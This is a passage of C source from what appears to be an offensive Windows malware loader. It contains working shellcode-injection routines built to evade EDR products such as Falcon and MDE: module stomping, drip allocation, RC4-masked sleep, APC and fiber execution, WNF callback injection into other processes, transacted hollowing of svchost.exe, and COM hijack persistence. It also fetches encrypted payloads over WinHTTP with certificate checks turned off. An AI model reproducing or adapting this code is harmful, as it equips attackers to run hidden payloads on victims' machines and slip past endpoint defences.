 *      Breaks single-event alloc→write→protect chain Falcon/MDE correlate.
 *   3. RC4 via SystemFunction032 during sleep — random ciphertext defeats static scans.
 *   4. QueueUserAPC to self + SleepEx(alertable) — no NtCreateThreadEx,
 *      no new thread at shellcode address, no PsSetCreateThreadNotifyRoutine event.
 */
static int POLY_SELFINJECT(PBYTE sc, SIZE_T sclen) {
    int _pvt=0; /* Task 13: track whether we own this allocation */
    PBYTE exec_base=POLY_MODSTOMP(sclen);
    if(!exec_base){
        /*
         * Task 17 — Drip allocation: MEM_RESERVE then commit+write 4KB at a time.
         * A single MEM_COMMIT|MEM_RESERVE + large NtWriteVirtualMemory generates one
         * large correlated kernel event.  Per-page commits are smaller, time-scattered,
         * and do not trigger the monolithic allocation heuristic.
         */
        SIZE_T _rsz=(sclen+0xFFF)&~(SIZE_T)0xFFF;
        PVOID _b=NULL;
        POLY_NTALLOC(GetCurrentProcess(),&_b,0,&_rsz,MEM_RESERVE,PAGE_NOACCESS);
        if(!_b) return 14;
        exec_base=(PBYTE)_b; _pvt=1;
        for(SIZE_T _off=0;_off<sclen;_off+=0x1000){
            PVOID _pg=(PVOID)(exec_base+_off); SIZE_T _psz=0x1000;
            POLY_NTALLOC(GetCurrentProcess(),&_pg,0,&_psz,MEM_COMMIT,PAGE_READWRITE);
            SIZE_T _chunk=(sclen-_off)>0x1000?0x1000:(sclen-_off);
            SIZE_T _w=0;
            POLY_NTWRITE(GetCurrentProcess(),(PVOID)(exec_base+_off),(PVOID)(sc+_off),_chunk,&_w);
            POLY_NTDELAY((LONGLONG)(3000LL+((_off>>12)%5)*1000LL)*10000LL);
        }
    } else {
        SIZE_T _w=0;
        POLY_NTWRITE(GetCurrentProcess(),exec_base,(PVOID)sc,sclen,&_w);
    }

    /* Entropic XOR key: blend tick, PID, TID — avoids tick-count-only patterns */
    DWORD tc=(DWORD)GetTickCount64();
    BYTE xkey=(BYTE)((tc^(GetCurrentProcessId()*7)^(GetCurrentThreadId()*13))&0xFE)|1;

    /* RC4-masked Ekko sleep — self-inverse, applied twice returns original bytes */
    POLY_EKKO_SLEEP(exec_base,sclen,xkey,2000+(tc%3000));

    /*
     * Task 16 — Callback-based execution via QueueUserAPC to self.
     * No NtCreateThreadEx → no PsSetCreateThreadNotifyRoutine kernel event.
     * No new thread starting at a private/stomped RX address → no Falcon thread-start alert.
     * Execution path: queue APC targeting current-thread pseudo-handle (-2),
     * then SleepEx(INFINITE, alertable=TRUE) → Windows dispatches APC in-thread.
     * Observed call stack: SleepEx → NtDelayExecution (ntdll) → [APC dispatch] → shellcode.
     * For non-returning shellcode (C2 agent): SleepEx blocks indefinitely — that is correct,
     * the agent takes over.  For returning shellcode (arsenal tools): SleepEx returns
     * WAIT_IO_COMPLETION once the APC routine completes, then cleanup runs.
     */
    lt_stomp_pe_headers(exec_base,sclen);
    QueueUserAPC((PAPCFUNC)exec_base,(HANDLE)(LONG_PTR)(-2),0);
    SleepEx(INFINITE,TRUE);

    /* Task 13: zero exec region post-execution; scanner finds no artifacts.
     * Private alloc → zero + NtFreeVirtualMemory.
     * Module stomp → zero + restore original protection (can't free the DLL section). */
    {
        PVOID _cb=(PVOID)exec_base; SIZE_T _csz=sclen; ULONG _co=0;
        if(NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&_cb,&_csz,PAGE_READWRITE,&_co))){
            lt_zero(exec_base,sclen);
            if(_pvt){ _cb=(PVOID)exec_base; _csz=0;
                POLY_NTFREE(GetCurrentProcess(),&_cb,&_csz,MEM_RELEASE);
            } else { _cb=(PVOID)exec_base; _csz=sclen;
                POLY_NTPROT(GetCurrentProcess(),&_cb,&_csz,_co,&_co);
            }
        }
    }
    return 0;
}

/*
 * Decode two-layer .enc: base64 → outer XOR (k1) → inner XOR (k2) → shellcode.
 * Both XOR keys are random per build — neither layer alone reveals the payload,
 * so donut/MSF stubs are unrecognisable at rest and in transit.
 */
static PBYTE lt_decenc(PBYTE raw, DWORD rawlen, SIZE_T *sclen) {
    if(!raw||rawlen<2) return NULL;
    raw[rawlen]=raw[rawlen+1]=0;
    DWORD blen=lt_b64dec(raw,rawlen,NULL);
    PBYTE blob=(PBYTE)HeapAlloc(GetProcessHeap(),0,blen+2); if(!blob) return NULL;
    lt_b64dec(raw,rawlen,blob);
    if(blen<3){HeapFree(GetProcessHeap(),0,blob);return NULL;}

    /* Outer decode: k1 = blob[0], inner_blob = blob[1:] ^ k1 */
    BYTE k1=blob[0]; DWORD ilen=blen-1;
    PBYTE inner=(PBYTE)HeapAlloc(GetProcessHeap(),0,ilen+2);
    if(!inner){HeapFree(GetProcessHeap(),0,blob);return NULL;}
    for(DWORD i=0;i<ilen;i++) inner[i]=blob[i+1]^k1;
    HeapFree(GetProcessHeap(),0,blob);

    if(ilen<2){HeapFree(GetProcessHeap(),0,inner);return NULL;}

    /* Inner decode: k2 = inner[0], sc = inner[1:] ^ k2 */
    BYTE k2=inner[0]; DWORD slen=ilen-1;
    PBYTE sc=(PBYTE)HeapAlloc(GetProcessHeap(),0,slen);
    if(!sc){HeapFree(GetProcessHeap(),0,inner);return NULL;}
    for(DWORD i=0;i<slen;i++) sc[i]=inner[i+1]^k2;
    HeapFree(GetProcessHeap(),0,inner);
    *sclen=slen; return sc;
}

/* ─── Local .enc file load ─── */
static PBYTE POLY_LOADENC(LPCSTR path, SIZE_T *sclen) {
    HANDLE h=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE) return NULL;
    DWORD fsz=GetFileSize(h,NULL);
    if(fsz==INVALID_FILE_SIZE||fsz==0){CloseHandle(h);return NULL;}
    PBYTE raw=(PBYTE)HeapAlloc(GetProcessHeap(),0,fsz+2); if(!raw){CloseHandle(h);return NULL;}
    DWORD rd=0; ReadFile(h,raw,fsz,&rd,NULL); CloseHandle(h);
    PBYTE sc=lt_decenc(raw,fsz,sclen);
    HeapFree(GetProcessHeap(),0,raw);
    return sc;
}

/* ─── WinHTTP URL parser ─── */
static BOOL lt_parse_url(LPCWSTR wurl, WCHAR *host, WORD *port, WCHAR *path, BOOL *is_https) {
    *is_https=(wurl[4]==L's');
    const WCHAR *p=wurl;
    while(*p&&*p!=L'/') p++;
    if(p[0]==L'/'&&p[1]==L'/') p+=2;
    const WCHAR *slash=p;
    while(*slash&&*slash!=L'/'&&*slash!=L':') slash++;
    DWORD hlen=(DWORD)(slash-p); if(hlen>=256) hlen=255;
    for(DWORD i=0;i<hlen;i++) host[i]=p[i]; host[hlen]=0;
    *port=(WORD)(*is_https?443:80);
    if(*slash==L':'){
        slash++; WORD n=0;
        while(*slash>=L'0'&&*slash<=L'9'){n=(WORD)(n*10+(*slash++-L'0'));}
        if(n) *port=n;
    }
    if(*slash){DWORD pl=0;while(slash[pl]&&pl<1023){path[pl]=slash[pl];pl++;}path[pl]=0;}
    else{path[0]=L'/';path[1]=0;}
    return TRUE;
}

/* ─── Shared WinHTTP setup: open session/conn/request, add headers ─── */
typedef struct {
    HMODULE hLib;
    pWHOpen fnOpen; pWHConnect fnConn; pWHOpenReq fnReq;
    pWHSend fnSend; pWHRecv fnRecv; pWHQAvail fnAvail;
    pWHRead fnRead; pWHClose fnClose; pWHSetOpt fnSetOpt; pWHAddHdr fnAddHdr;
    HINTERNET hSess; HINTERNET hConn; HINTERNET hReq;
} LT_WH;

static BOOL lt_wh_open(LT_WH *wh, LPCSTR url_a, LPCWSTR method) {
    int wsz=MultiByteToWideChar(CP_ACP,0,url_a,-1,NULL,0);
    if(wsz<=0) return FALSE;
    WCHAR *wurl=(WCHAR*)HeapAlloc(GetProcessHeap(),0,wsz*sizeof(WCHAR));
    if(!wurl) return FALSE;
    MultiByteToWideChar(CP_ACP,0,url_a,-1,wurl,wsz);

    WCHAR host[256]; host[0]=0; WORD port=0; WCHAR path[1024]; path[0]=0; BOOL is_https=FALSE;
    lt_parse_url(wurl,host,&port,path,&is_https);
    HeapFree(GetProcessHeap(),0,wurl);

    wh->hLib=LoadLibraryA("winhttp.dll"); if(!wh->hLib) return FALSE;
    wh->fnOpen  =(pWHOpen)  GetProcAddress(wh->hLib,"WinHttpOpen");
    wh->fnConn  =(pWHConnect)GetProcAddress(wh->hLib,"WinHttpConnect");
    wh->fnReq   =(pWHOpenReq)GetProcAddress(wh->hLib,"WinHttpOpenRequest");
    wh->fnSend  =(pWHSend)  GetProcAddress(wh->hLib,"WinHttpSendRequest");
    wh->fnRecv  =(pWHRecv)  GetProcAddress(wh->hLib,"WinHttpReceiveResponse");
    wh->fnAvail =(pWHQAvail)GetProcAddress(wh->hLib,"WinHttpQueryDataAvailable");
    wh->fnRead  =(pWHRead)  GetProcAddress(wh->hLib,"WinHttpReadData");
    wh->fnClose =(pWHClose) GetProcAddress(wh->hLib,"WinHttpCloseHandle");
    wh->fnSetOpt=(pWHSetOpt)GetProcAddress(wh->hLib,"WinHttpSetOption");
    wh->fnAddHdr=(pWHAddHdr)GetProcAddress(wh->hLib,"WinHttpAddRequestHeaders");
    if(!wh->fnOpen||!wh->fnConn||!wh->fnReq||!wh->fnSend||
       !wh->fnRecv||!wh->fnAvail||!wh->fnRead||!wh->fnClose)
        {FreeLibrary(wh->hLib);return FALSE;}

    Sleep(500+(GetTickCount()%3000));
    wh->hSess=wh->fnOpen(LT_USER_AGENT,0,NULL,NULL,0);
    if(!wh->hSess){FreeLibrary(wh->hLib);return FALSE;}
    wh->hConn=wh->fnConn(wh->hSess,host,port,0);
    if(!wh->hConn){wh->fnClose(wh->hSess);FreeLibrary(wh->hLib);return FALSE;}
    DWORD rflags=is_https?0x00800000:0;
    wh->hReq=wh->fnReq(wh->hConn,method,path,NULL,NULL,NULL,rflags);
    if(!wh->hReq){wh->fnClose(wh->hConn);wh->fnClose(wh->hSess);FreeLibrary(wh->hLib);return FALSE;}

    if(is_https&&wh->fnSetOpt){
        DWORD ig=0x00003300; wh->fnSetOpt(wh->hReq,31,&ig,sizeof(DWORD));
    }
    if(wh->fnAddHdr)
        wh->fnAddHdr(wh->hReq,
            L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            L"Accept-Language: en-US,en;q=0.9\r\n"
            L"Accept-Encoding: gzip, deflate, br\r\n"
            L"Cache-Control: no-cache\r\n"
            L"Pragma: no-cache\r\n"
            L"Connection: keep-alive\r\n",
            (DWORD)-1L,1);
    return TRUE;
}
static void lt_wh_close(LT_WH *wh){
    if(wh->hReq)  wh->fnClose(wh->hReq);
    if(wh->hConn) wh->fnClose(wh->hConn);
    if(wh->hSess) wh->fnClose(wh->hSess);
    if(wh->hLib)  FreeLibrary(wh->hLib);
}
static PBYTE lt_wh_read_body(LT_WH *wh, DWORD *total_out) {
    PBYTE buf=NULL; DWORD total=0;
    for(;;){
        DWORD avail=0;
        if(!wh->fnAvail(wh->hReq,&avail)||avail==0) break;
        PBYTE tmp=(PBYTE)HeapAlloc(GetProcessHeap(),0,total+avail+2);
        if(!tmp) break;
        if(buf){for(DWORD i=0;i<total;i++) tmp[i]=buf[i];HeapFree(GetProcessHeap(),0,buf);}
        buf=tmp; DWORD rd=0;
        if(!wh->fnRead(wh->hReq,buf+total,avail,&rd)||rd==0) break;
        total+=rd;
    }
    if(buf) buf[total]=buf[total+1]=0;
    if(total_out) *total_out=total;
    return buf;
}

/* ─── WinHTTP GET: downloads URL, decodes .enc, returns shellcode ─── */
static PBYTE POLY_HTTPGET(LPCSTR url_a, SIZE_T *sclen) {
    LT_WH wh; wh.hLib=NULL; wh.hSess=NULL; wh.hConn=NULL; wh.hReq=NULL;
    if(!lt_wh_open(&wh,url_a,L"GET")) return NULL;
    if(!wh.fnSend(wh.hReq,NULL,0,NULL,0,0,0)||!wh.fnRecv(wh.hReq,NULL))
        {lt_wh_close(&wh);return NULL;}
    DWORD total=0;
    PBYTE buf=lt_wh_read_body(&wh,&total);
    lt_wh_close(&wh);
    if(!buf||total==0){if(buf)HeapFree(GetProcessHeap(),0,buf);return NULL;}
    PBYTE sc=lt_decenc(buf,total,sclen);
    HeapFree(GetProcessHeap(),0,buf);
    return sc;
}

/*
 * WinHTTP POST: sends body, returns raw response bytes.
 * If resp_len is NULL the response body is discarded.
 * Returns NULL on failure; returns heap-allocated buffer on success (even if empty).
 */
static PBYTE POLY_HTTPPOST(LPCSTR url_a, PBYTE body, DWORD body_len, DWORD *resp_len) {
    LT_WH wh; wh.hLib=NULL; wh.hSess=NULL; wh.hConn=NULL; wh.hReq=NULL;
    if(!lt_wh_open(&wh,url_a,L"POST")) return NULL;
    if(wh.fnAddHdr)
        wh.fnAddHdr(wh.hReq,L"Content-Type: application/json\r\n",(DWORD)-1L,1);
    if(!wh.fnSend(wh.hReq,NULL,0,body,body_len,body_len,0)||!wh.fnRecv(wh.hReq,NULL))
        {lt_wh_close(&wh);return NULL;}
    DWORD total=0;
    PBYTE buf=lt_wh_read_body(&wh,&total);
    lt_wh_close(&wh);
    if(resp_len) *resp_len=total;
    if(!buf){
        buf=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,4);
        if(resp_len) *resp_len=0;
    }
    return buf;
}

/* ─── Raw HTTP GET (no .enc layer) — agent upload command fetches files here ─── */
static PBYTE lt_http_raw_get(LPCSTR url_a, DWORD *out_len) {
    LT_WH wh; lt_zero(&wh,sizeof(wh));
    if(out_len) *out_len=0;
    if(!lt_wh_open(&wh,url_a,L"GET")) return NULL;
    if(!wh.fnSend(wh.hReq,NULL,0,NULL,0,0,0)||!wh.fnRecv(wh.hReq,NULL))
        {lt_wh_close(&wh);return NULL;}
    DWORD total=0;
    PBYTE buf=lt_wh_read_body(&wh,&total);
    lt_wh_close(&wh);
    if(!buf||total==0){if(buf)HeapFree(GetProcessHeap(),0,buf);return NULL;}
    if(out_len) *out_len=total;
    return buf;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Tasks 5–8, 11–12, 14 — new evasion primitives
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Task 7 — Fiber-based self-execution.
 *
 * Executes shellcode on the CURRENT thread converted to a fiber.
 * No NtCreateThreadEx → no PsSetCreateThreadNotifyRoutine kernel event.
 * Shellcode runs as a fiber scheduled onto an existing thread; from the
 * kernel's perspective no new thread object is ever created.
 */
static int POLY_FIBER_EXEC(PBYTE sc, SIZE_T sclen) {
    HMODULE hK32=GetModuleHandleA("kernel32.dll"); if(!hK32) return 0;
    typedef PVOID (WINAPI *pfnCTF)(LPVOID);
    typedef PVOID (WINAPI *pfnCF)(SIZE_T,LPFIBER_START_ROUTINE,LPVOID);
    typedef VOID  (WINAPI *pfnSTF)(PVOID);
    pfnCTF fnCTF=(pfnCTF)GetProcAddress(hK32,"ConvertThreadToFiber");
    pfnCF  fnCF =(pfnCF) GetProcAddress(hK32,"CreateFiber");
    pfnSTF fnSTF=(pfnSTF)GetProcAddress(hK32,"SwitchToFiber");
    if(!fnCTF||!fnCF||!fnSTF) return 0;

    int _pvt=0;
    PBYTE exec_base=POLY_MODSTOMP(sclen);
    if(!exec_base){
        PVOID base=NULL; SIZE_T sz=sclen;
        POLY_NTALLOC(GetCurrentProcess(),&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!base) return 0;
        exec_base=(PBYTE)base; _pvt=1;
    }
    SIZE_T w=0;
    POLY_NTWRITE(GetCurrentProcess(),exec_base,sc,sclen,&w);

    DWORD tc=(DWORD)GetTickCount64();
    BYTE xkey=(BYTE)((tc^(GetCurrentProcessId()*7))&0xFE)|1;
    POLY_EKKO_SLEEP(exec_base,sclen,xkey,1500+(tc%2000));
    lt_stomp_pe_headers(exec_base,sclen);

    PVOID mainFiber=fnCTF(NULL);
    if(!mainFiber){
        if(_pvt){PVOID _b=(PVOID)exec_base;SIZE_T _s=0;POLY_NTFREE(GetCurrentProcess(),&_b,&_s,MEM_RELEASE);}
        return 0;
    }
    PVOID scFiber=fnCF(0,(LPFIBER_START_ROUTINE)exec_base,mainFiber);
    if(!scFiber){
        if(_pvt){PVOID _b=(PVOID)exec_base;SIZE_T _s=0;POLY_NTFREE(GetCurrentProcess(),&_b,&_s,MEM_RELEASE);}
        return 0;
    }
    fnSTF(scFiber); /* shellcode runs on this thread — returns when SC switches back or exits */
    return 1;
}

/*
 * Task 5 — WNF (Windows Notification Facility) injection.
 *
 * Injects into a target process without NtCreateThreadEx or APC:
 *   1. Allocate shellcode in target (RW → RX).
 *   2. Find _WNF_SUBSCRIPTION_TABLE in local ntdll by scanning
 *      RtlSubscribeWnfStateChangeNotification for a LEA [rip+disp32].
 *      ntdll is mapped at the same VA in every process (ASLR slides once
 *      per boot and is shared).
 *   3. Walk the remote process's subscription list via NtReadVirtualMemory.
 *   4. Overwrite the first valid subscriber's Callback pointer.
 *   5. NtUpdateWnfStateData → kernel delivers notification → target thread
 *      executes our shellcode in-place (no new thread object).
 *
 * _WNF_USER_SUBSCRIPTION offsets (Win10 20H2 – Win11 23H2):
 *   +0x00 LIST_ENTRY (Flink/Blink)
 *   +0x10 StateName (ULONGLONG)
 *   +0x28 Callback  ← overwrite this
 */
#define _WNF_NAMES_OFF   0x30   /* NamesTableEntry Flink in _WNF_SUBSCRIPTION_TABLE */
#define _WNF_SUB_OFF     0x40   /* SubscriptionList Flink in _WNF_NAME_SUBSCRIPTION */
#define _WNF_CB_OFF      0x28   /* Callback ptr in _WNF_USER_SUBSCRIPTION           */
#define _WNF_SN_OFF      0x10   /* StateName in _WNF_USER_SUBSCRIPTION              */

static PVOID lt_find_wnf_table(void) {
    PBYTE fn=(PBYTE)GetProcAddress((HMODULE)POLY_NTDLL,
        "RtlSubscribeWnfStateChangeNotification");
    if(!fn) return NULL;
    /* Scan for LEA reg,[rip+disp32]: 48/4C 8D {05|0D|15|1D} xx xx xx xx */
    for(int i=0;i<512;i++){
        if((fn[i]==0x48||fn[i]==0x4C)&&fn[i+1]==0x8D&&
           (fn[i+2]==0x05||fn[i+2]==0x0D||fn[i+2]==0x15||fn[i+2]==0x1D)){
            INT32 off=*(INT32*)(fn+i+3);
            PVOID addr=(PVOID)(fn+i+7+(LONG_PTR)off);
            /* Validate: location holds a non-null pointer */
            if(addr&&*(PVOID*)addr) return addr;
        }
    }
    return NULL;
}

static BOOL POLY_WNF_INJECT(DWORD pid, PBYTE sc, SIZE_T sclen) {
    if(!pid||!sc||!sclen) return FALSE;

    PVOID *pTable=(PVOID*)lt_find_wnf_table();
    if(!pTable||!*pTable) return FALSE;
    PBYTE table=(PBYTE)*pTable;

    CLIENT_ID cid={0}; cid.UniqueProcess=(HANDLE)(ULONG_PTR)pid;
    OBJECT_ATTRIBUTES oa={sizeof(OBJECT_ATTRIBUTES)};
    HANDLE hProc=NULL;
    if(!NT_SUCCESS(POLY_NTOPEN(&hProc,PROCESS_ALL_ACCESS,&oa,&cid))) return FALSE;

    /* Allocate + write shellcode in target */
    PVOID sc_base=NULL; SIZE_T sc_sz=sclen;
    if(!NT_SUCCESS(POLY_NTALLOC(hProc,&sc_base,0,&sc_sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE))){
        POLY_NTCLOSE(hProc); return FALSE;
    }
    SIZE_T wr=0;
    POLY_NTWRITE(hProc,sc_base,sc,sclen,&wr);
    ULONG old=0; PVOID pb=sc_base; SIZE_T psz=sc_sz;
    POLY_NTPROT(hProc,&pb,&psz,PAGE_EXECUTE_READ,&old);

    /* Walk NamesTableEntry linked list */
    PVOID flink=NULL; SIZE_T rd=0;
    POLY_NTRDMEM(hProc,table+_WNF_NAMES_OFF,&flink,sizeof(flink),&rd);
    PBYTE cur_name=(PBYTE)flink;
    PBYTE names_head=table+_WNF_NAMES_OFF;
    BOOL ok=FALSE;

    for(int ni=0;ni<128&&cur_name&&cur_name!=names_head&&!ok;ni++){
        /* Read SubscriptionList Flink */
        PVOID sub_flink=NULL;
        POLY_NTRDMEM(hProc,cur_name+_WNF_SUB_OFF,&sub_flink,sizeof(sub_flink),&rd);
        PBYTE sub_head=cur_name+_WNF_SUB_OFF;
        PBYTE cur_sub=(PBYTE)sub_flink;

        for(int si=0;si<32&&cur_sub&&cur_sub!=sub_head&&!ok;si++){
            /* Patch remote Callback pointer */
            PVOID cb_new=sc_base;
            /* Temporarily make callback slot writable in remote process */
            PVOID cpb=cur_sub+_WNF_CB_OFF; SIZE_T csz=sizeof(PVOID); ULONG co=0;
            POLY_NTPROT(hProc,&cpb,&csz,PAGE_READWRITE,&co);
            POLY_NTWRITE(hProc,cur_sub+_WNF_CB_OFF,&cb_new,sizeof(cb_new),&wr);
            cpb=cur_sub+_WNF_CB_OFF; csz=sizeof(PVOID);
            POLY_NTPROT(hProc,&cpb,&csz,co,&co);

            /* Read StateName for trigger */
            ULONGLONG sn=0;
            POLY_NTRDMEM(hProc,cur_sub+_WNF_SN_OFF,&sn,sizeof(sn),&rd);
            if(sn){ POLY_NTWNFUPD(&sn,(PVOID)"X",1,NULL,NULL,0,0); ok=TRUE; }

            /* Advance subscription list */
            PVOID nx=NULL;
            POLY_NTRDMEM(hProc,cur_sub,&nx,sizeof(nx),&rd);
            cur_sub=(PBYTE)nx;
        }
        /* Advance names list */
        PVOID nn=NULL;
        POLY_NTRDMEM(hProc,cur_name,&nn,sizeof(nn),&rd);
        cur_name=(PBYTE)nn;
    }

    POLY_NTCLOSE(hProc);
    return ok;
}

/*
 * Task 6 — Transacted Process Hollowing.
 *
 * Creates a process whose on-disk binary is a legitimate signed PE, but whose
 * in-memory image is our payload.  EDR image-hash checks pass because the
 * committed file on disk is never touched.
 *
 * Steps:
 *   1. CreateTransaction (KtmW32.dll)
 *   2. CreateFileTransactedW on a System32 binary (opens the file in-transaction).
 *   3. WriteFile with payload PE (visible only in this transaction context).
 *   4. NtCreateSection (SEC_IMAGE) on the transacted handle.
 *   5. NtCreateProcessEx from the section — memory holds payload, disk holds original.
 *   6. Create entry-point thread in the new process.
 *   7. Transaction abandoned → disk is pristine.
 *
 * pe_buf must be a valid x64 PE image with correct headers.
 */
static BOOL POLY_TRANSACT_HOLLOW(PBYTE pe_buf, SIZE_T pe_size) {
    typedef HANDLE (WINAPI *pfnCT)(LPSECURITY_ATTRIBUTES,LPGUID,DWORD,DWORD,DWORD,DWORD,LPWSTR);
    typedef BOOL   (WINAPI *pfnRT)(HANDLE);
    typedef HANDLE (WINAPI *pfnCFT)(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE,HANDLE,PUSHORT,PVOID);
    typedef NTSTATUS (NTAPI *pfnNtCS)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
    typedef NTSTATUS (NTAPI *pfnNtCPEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,ULONG,HANDLE,HANDLE,HANDLE,BOOLEAN);

    HMODULE hKtm=LoadLibraryA("KtmW32.dll"); if(!hKtm) return FALSE;
    pfnCT  fnCT =(pfnCT) GetProcAddress(hKtm,"CreateTransaction");
    pfnRT  fnRT =(pfnRT) GetProcAddress(hKtm,"RollbackTransaction");
    pfnCFT fnCFT=(pfnCFT)GetProcAddress(GetModuleHandleA("kernel32.dll"),"CreateFileTransactedW");
    pfnNtCS  fnNtCS =(pfnNtCS) GetProcAddress((HMODULE)POLY_NTDLL,"NtCreateSection");
    pfnNtCPEx fnNtCP=(pfnNtCPEx)GetProcAddress((HMODULE)POLY_NTDLL,"NtCreateProcessEx");
    if(!fnCT||!fnRT||!fnCFT||!fnNtCS||!fnNtCP){FreeLibrary(hKtm);return FALSE;}

    /* Target: svchost.exe (legitimate signed binary in System32) */
    WCHAR target[520]; UINT sn=GetSystemDirectoryW(target,500);
    static const WCHAR _sv[]={L'\\',L's',L'v',L'c',L'h',L'o',L's',L't',L'.',L'e',L'x',L'e',0};
    int ti=(int)sn; for(int j=0;_sv[j];j++) target[ti++]=_sv[j]; target[ti]=0;

    HANDLE hTxn=fnCT(NULL,NULL,0,0,0,INFINITE,NULL);
    if(!hTxn||hTxn==INVALID_HANDLE_VALUE){FreeLibrary(hKtm);return FALSE;}

    /* Open svchost.exe inside the transaction — writes stay in-transaction */
    HANDLE hFile=fnCFT(target,GENERIC_WRITE|GENERIC_READ,0,NULL,
                       OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL,hTxn,NULL,NULL);
    if(hFile==INVALID_HANDLE_VALUE){fnRT(hTxn);CloseHandle(hTxn);FreeLibrary(hKtm);return FALSE;}

    /* Write payload (only visible within this transaction) */
    SetFilePointer(hFile,0,NULL,FILE_BEGIN);
    DWORD bw=0; WriteFile(hFile,pe_buf,(DWORD)pe_size,&bw,NULL);
    SetEndOfFile(hFile);

    /* Create SEC_IMAGE section from the transacted file */
    HANDLE hSec=NULL;
    NTSTATUS st=fnNtCS(&hSec,SECTION_ALL_ACCESS,NULL,NULL,PAGE_READONLY,SEC_IMAGE,hFile);
    CloseHandle(hFile);
    if(!NT_SUCCESS(st)){fnRT(hTxn);CloseHandle(hTxn);FreeLibrary(hKtm);return FALSE;}

    /* Create process from section — in-memory image is our payload */
    HANDLE hProc=NULL;
    st=fnNtCP(&hProc,PROCESS_ALL_ACCESS,NULL,GetCurrentProcess(),0,hSec,NULL,NULL,FALSE);
    CloseHandle(hSec);

    /* Abandon transaction — disk file is restored to original svchost.exe */
    fnRT(hTxn); CloseHandle(hTxn); FreeLibrary(hKtm);
    if(!NT_SUCCESS(st)||!hProc) return FALSE;

    /* Parse PE headers to find entry point and image base */
    if(pe_size<0x80){CloseHandle(hProc);return FALSE;}
    DWORD elf=*(DWORD*)(pe_buf+0x3C);
    if((DWORD)elf+0x50>(DWORD)pe_size){CloseHandle(hProc);return FALSE;}
    DWORD ep_rva  =*(DWORD*) (pe_buf+elf+0x28); /* AddressOfEntryPoint */
    ULONGLONG imgb=*(ULONGLONG*)(pe_buf+elf+0x30); /* ImageBase (x64)    */
    PVOID ep=(PVOID)(imgb+(ULONGLONG)ep_rva);

    HANDLE hTh=NULL;
    POLY_NTTHREAD(&hTh,THREAD_ALL_ACCESS,NULL,hProc,ep,NULL,0,0,0x200000,0x200000,NULL);
    if(hTh) POLY_NTCLOSE(hTh);
    CloseHandle(hProc);
    return hTh!=NULL;
}

/*
 * Task 8 — COM Server Hijacking.
 *
 * Registers a per-user COM server under HKCU\Software\Classes\CLSID.
 * When a privileged process CoCreateInstance's that CLSID, Windows loads
 * our DLL in that process's context — no injection API is called at all.
 * Common CLSIDs instantiated by high-privilege host processes:
 *   {BCDE0395-E52F-467C-8E3D-C4579291692E}  MMDeviceEnumerator (Audio)
 *   {4590F811-1D3A-11D0-891F-00AA004B2E24}  WbemLocator (WMI)
 *
 * dll_path_w: wide path to payload DLL already on disk.
 * clsid_str:  "{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}" ASCII string.
 */
typedef LONG (WINAPI *pfnRegCKEx)(HKEY,LPCWSTR,DWORD,LPWSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG (WINAPI *pfnRegSVEx)(HKEY,LPCWSTR,DWORD,DWORD,const BYTE*,DWORD);
typedef LONG (WINAPI *pfnRegCH)(HKEY);
typedef LONG (WINAPI *pfnRegDT)(HKEY,LPCWSTR);

static BOOL POLY_COM_HIJACK(LPCWSTR dll_path_w, const char *clsid_str) {
    HMODULE hAdv=LoadLibraryA("advapi32.dll"); if(!hAdv) return FALSE;
    pfnRegCKEx fnCKEx=(pfnRegCKEx)GetProcAddress(hAdv,"RegCreateKeyExW");
    pfnRegSVEx fnSVEx=(pfnRegSVEx)GetProcAddress(hAdv,"RegSetValueExW");
    pfnRegCH   fnCH  =(pfnRegCH)  GetProcAddress(hAdv,"RegCloseKey");
    if(!fnCKEx||!fnSVEx||!fnCH){FreeLibrary(hAdv);return FALSE;}

    /* Build HKCU\Software\Classes\CLSID\{GUID}\InprocServer32 */
    char kp[320]; lt_strcpy(kp,"Software\\Classes\\CLSID\\");
    lt_strcat(kp,clsid_str); lt_strcat(kp,"\\InprocServer32");
    WCHAR wk[400]; int ki=0;
    while(kp[ki]&&ki<398){wk[ki]=(WCHAR)(unsigned char)kp[ki];ki++;} wk[ki]=0;

    HKEY hKey=NULL;
    if(fnCKEx(HKEY_CURRENT_USER,wk,0,NULL,REG_OPTION_NON_VOLATILE,
               KEY_SET_VALUE,NULL,&hKey,NULL)!=0){FreeLibrary(hAdv);return FALSE;}

    DWORD dll_len=(DWORD)((lstrlenW(dll_path_w)+1)*sizeof(WCHAR));
    fnSVEx(hKey,NULL,0,REG_SZ,(const BYTE*)dll_path_w,dll_len);
    static const WCHAR _tm[]={L'T',L'h',L'r',L'e',L'a',L'd',L'i',L'n',L'g',L'M',L'o',L'd',L'e',L'l',0};
    static const WCHAR _bt[]={L'B',L'o',L't',L'h',0};
    fnSVEx(hKey,_tm,0,REG_SZ,(const BYTE*)_bt,sizeof(_bt));
    fnCH(hKey);
    FreeLibrary(hAdv);
    return TRUE;
}

static void POLY_COM_HIJACK_CLEAN(const char *clsid_str) {
    HMODULE hAdv=LoadLibraryA("advapi32.dll"); if(!hAdv) return;
    pfnRegDT fnDT=(pfnRegDT)GetProcAddress(hAdv,"RegDeleteTreeW");
    if(fnDT){
        char kp[280]; lt_strcpy(kp,"Software\\Classes\\CLSID\\"); lt_strcat(kp,clsid_str);
        WCHAR wk[320]; int ki=0;
        while(kp[ki]&&ki<318){wk[ki]=(WCHAR)(unsigned char)kp[ki];ki++;} wk[ki]=0;
        fnDT(HKEY_CURRENT_USER,wk);
    }
    FreeLibrary(hAdv);
}

/*
